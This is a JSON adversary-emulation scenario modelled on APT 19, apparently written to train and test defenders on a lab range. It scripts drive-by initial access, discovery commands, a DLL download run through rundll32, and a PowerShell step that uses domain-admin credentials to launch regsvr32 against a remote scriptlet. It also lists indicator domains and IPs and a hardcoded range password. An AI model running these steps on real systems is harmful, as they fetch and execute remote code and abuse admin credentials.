@@ -1,0 +1,564 @@
+{
+    "meta_data": {
+        "name": "apt19",
+        "version": "v1.0.0",
+        "title": "APT 19 Inspired Scenario",
+        "description": "This inspired scenario by a Chinese-based threat group (APT 19) focuses on host reconnaissance and",
+        "author": "Attack Content",
+        "suggested_duration": 560
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "MessageBoxPopup_DllPopUp_PopUp_Main.dll",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS3",
+            "preconditions": {
+                "driveby": "self.driveby3"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX3",
+            "preconditions": {
+                "payload": "regsvr32_popup_execution.sct",
+                "driveby": "self.driveby3",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "get_ipconfig",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "ipconfig /all"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "get_hostname",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "hostname"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "get_current_user",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "whoami"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "get_systeminfo",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "systeminfo"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "get_cpu_info",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell Get-CimInstance -ComputerName localhost -Class CIM_Processor -ErrorAction Stop | Select-Object *"
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "Get-kit_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_store_server": "self.driveby_domain2",
+                    "file_name": "self.tool_name2",
+                    "output_directory": "C:\\Users\\Public",
+                    "output_file_name": "popup.dll"
+                }
+            }
+        },
+        {
+            "tactic": "Rundll32",
+            "technique": "DefenseEvasion",
+            "label": "Rundll32_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{start-process powershell -argumentlist '-noprofile -command &{Start-Process rundll32.exe -arg C:\\Users\\Public\\popup.dll,PopUp }';echo ' '}"
+                }
+            }
+        },
+        {
+            "tactic": "ValidAccounts_DomainAccounts",
+            "technique": "PrivilegeEscalation",
+            "label": "validAccounts_DomainAccounts_Command_1_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_1_elevated",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$password = ConvertTo-SecureString '",
+                            "self.domain_admin_password",
+                            "' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\",
+                            "self.domain_admin_username",
+                            "', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{powershell -c regsvr32.exe /s /n /i:http://",
+                            "self.driveby_domain3",
+                            "/",
+                            "self.tool_name3",
+                            " scrobj.dll}'};echo 'Done'"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "jbossas.org",
+            "supermanbox.org",
+            "microsoft-cache.com",
+            "autodiscovery.2bunny.com",
+            "sfo02s01-in-f2.cloudsend.net",
+            "tx06s02-in-f2.cloudsend.net",
+            "lyncdiscover.2bunny.com",
+            "autodiscover.2bunny.com",
+            "tk-in-f156.2bunny.com",
+            "forbesinc.com",
+            "forbsinc.com",
+            "superbox.org",
+            "forbesenterprise.com",
+            "forbesenterprises.com",
+            "forbesinc.2bunny.com",
+            "discovery.2bunny.com",
+            "microsoft-fastcache.com",
+            "maildiscovery.2bunny.com"
+        ],
+        "ip": [
+            "104.236.77.169/24",
+            "138.68.45.9/24",
+            "162.243.143.145/24",
+            "210.181.184.64/24",
+            "218.54.139.20/24",
+            "42.200.18.194/24",
+            "121.54.15.250/24",
+            "121.54.19.12/24",
+            "121.54.55.207/24",
+            "121.54.87.126/24",
+            "121.54.93.131/24",
+            "121.54.104.3/24",
+            "121.54.143.131/24",
+            "121.54.166.75/24",
+            "121.54.185.213/24",
+            "121.54.197.15/24",
+            "121.54.211.56/24",
+            "121.54.233.201/24"
+        ],
+        "binary": [
+            "dbgeng.exe",
+            "fakerx86.exe",
+            "rundll32.exe",
+            "netsvcs.exe",
+            "McAltLib.exe",
+            "oledbgeng.exe",
+            "DncpClient.exe",
+            "DHCPClient.exe",
+            "DHCPService.exe",
+            "DnsClient.exe",
+            "DncpService.exe",
+            "dnsclientmon.exe",
+            "wuservice.exe",
+            "MSAgent.exe",
+            "AutoDiscover.exe",
+            "winnetsvcs.exe"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "5",
+                "ioc-ip_callback": "122.49.215.108/24",
+                "ioc-domain_callback": "inform.bedircati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "MessageBoxPopup_DllPopUp_PopUp_Main.dll"
+            },
+            "3": {
+                "name": "regsvr32_popup_execution.sct"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "range": {
+            "query-ad_domain": "site.lan"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "157.32.19.24/24",
+                "ioc-domain_driveby": "arkansaspumps.us"
+            },
+            "3": {
+                "ioc-ip_driveby": "121.34.22.56/24",
+                "ioc-domain_driveby": "pickupsticks.com"
+            }
+        },
+        "targets": {
+            "1": {
+                "query-target_control_ip": "10.10.5.101",
+                "query-target_ip": "172.16.5.101",
+                "query-target_hostname": "dev-win10-1",
+                "query-exfil_files": [
+                    "C:\\secrets.txt",
+                    "C:\\secrets.zip"
+                ],
+                "payload_destination": "c:\\users\\Public",
+                "query-target_email": "Madelyn.Luna@site.com",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!",
+                "query-target_domain": "site.lan"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "tool_name3": {
+                "path": [
+                    "tool",
+                    "3",
+                    "name"
+                ]
+            },
+            "range": {
+                "path": [
+                    "range"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby3": {
+                "path": [
+                    "driveby",
+                    "3"
+                ]
+            },
+            "driveby_domain3": {
+                "path": [
+                    "driveby",
+                    "3",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "domain_admin_username": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_username"
+                ]
+            },
+            "domain_admin_password": {
+                "path": [
+                    "targets",
+                    "1",
+                    "query-domain_admin_password"
+                ]
+            },
+            "ad_domain": {
+                "path": "site.lan"
+            },
+            "target_1_elevated": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "ingresstooltransfer_1": {
+                "path": [
+                    "ingresstooltransfer",
+                    "1"
+                ]
+            },
+            "domain": {
+                "path": [
+                    "range",
+                    "query-ad_domain"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
